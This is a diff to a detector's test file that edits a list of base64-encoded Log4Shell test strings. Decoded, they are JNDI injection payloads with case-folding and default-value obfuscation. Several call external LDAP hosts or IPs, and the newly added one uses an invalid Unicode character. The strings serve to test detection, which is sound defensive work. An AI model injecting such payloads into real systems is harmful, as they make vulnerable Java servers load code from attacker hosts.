@@ -38,11 +38,13 @@ TEST_STRINGS_POSITIVE = [
     "JHtqbmRpOiR7bG93ZXI6bH0ke2xvd2VyOmR9JHtsb3dlcjphfSR7bG93ZXI6cH06Ly8xOTUuNTQuMTYwLjE0OToxMjM0NC9CYXNpYy9Db21tYW5kL0Jhc2U2NC9YWFhYWD19",
     "JHtqbmRpOmxkYXA6Ly8xNzkuNDMuMTc1LjEwMToxMzg5L30=",
     # Base64 pattern
-    "JHske2Jhc2U2NDpKSHRxYm1ScE9teGtZWEE2WVdSa2NuMD19fQ==",
+    #"JHske2Jhc2U2NDpKSHRxYm1ScE9teGtZWEE2WVdSa2NuMD19fQ==",
     "JHtqbiR7YmFzZTY0OlpHaz19OmxkYXA6Ly99",
     # New patterns https://github.com/Neo23x0/log4shell-detector/issues/47
     "LyUzRng9JCU3QmpuZGk6bGRhcDovZ3VpZGVkaGFja2luZy5jb20uYzZ0c2lmcDJwaWo5MWUza2FmdDBjZzdoMXhheXl5eXluLmV4cGxvcmVsb2NhbHBhdGhzLmNvbS9hJTdE",
     "JHskezo6LWp9JHs6Oi1ufSR7OjotZH0kezo6LWl9OiR7OjotbH0kezo6LWR9JHs6Oi1hfSR7OjotcH06Ly97e0hvc3RuYW1lfX0uYzZ0c2lmcDJwaWo5MWUza2FmdDBjZzdoMXhheXl5eXluLmV4cGxvcmVsb2NhbHBhdGhzLmNvbX0=",
+    # Invalid Unicodes
+    "JHtqbmQke3VwcGVyOsSxfTpsZGFwOi8vc29tZXNpdGVoYWNrZXJvZmhlbGwuY29tL3p9"
 ]
 
 TEST_STRINGS_POSITIVE_GZ = [
